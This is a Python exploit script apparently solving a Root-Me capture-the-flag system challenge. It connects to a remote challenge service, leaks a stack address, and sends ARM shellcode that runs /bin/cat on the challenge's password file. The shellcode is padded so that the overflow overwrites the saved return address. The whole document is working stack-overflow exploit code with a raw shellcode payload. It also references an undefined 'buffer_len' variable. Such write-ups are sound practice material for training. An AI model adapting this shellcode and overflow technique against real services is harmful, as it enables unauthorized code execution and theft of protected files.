import socket
import struct
import time

def send(sock, msg):
    global buffer_len
    try:
        sock.send(msg)
        time.sleep(2)
        return sock.recv(1024).decode()
    except:
        return ''

# execve(/bin/cat, /challenge/app-systeme/ch45/.passwd, NULL)
shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x5a\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x61\x70\x70\x2d\x73\x79\x73\x74\x65\x6d\x65\x2f\x63\x68\x34\x35\x2f\x2e\x70\x61\x73\x73\x77\x64'
offset = 164  # the offset to lr's value
print('[!] Shellcode\'s length: {0}.'.format(len(shellcode)))

#======================================================================================
#                             Starting the communication
#======================================================================================
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('challenge04.root-me.org', 61045))
time.sleep(2)

resp = sock.recv(buffer_len)
if 'Give me data to dump' not in resp.decode():
    print('[-] Failed to get the initial message.')
    exit(1)
print('[+] Starting communicating with the service.')

#======================================================================================
#                               Leaking the address
#======================================================================================
resp = send(sock, b'A\n')
if 'Dump again' not in resp:
    print('[-] Failed to get the local variable address.')
    exit(1)
stack = resp.split(':')[0]
print('[+] Found stack offset - {0}.'.format(stack))

resp = send(sock, b'y\n')
if 'Give me data to dump' not in resp:
    print('[-] Failed to get the re-dump message.')
    exit(1)

#======================================================================================
#                   Building the shellcode and getting the flag
#======================================================================================

print('[+] Preparing the shellcode')
stack = struct.pack('I', int(stack, 16))
shellcode += b'A' * (offset - len(shellcode)) + stack + b'\n'

resp = send(sock, shellcode)
if 'Dump again' not in resp:
    print('[-] Failed to send the shellcode.')
    exit(1)
print('[+] The shellcode sent to the remote service.')

resp = send(sock, b'n\n')
print('[+] Flag: {0}.'.format(resp.strip()))

sock.close()
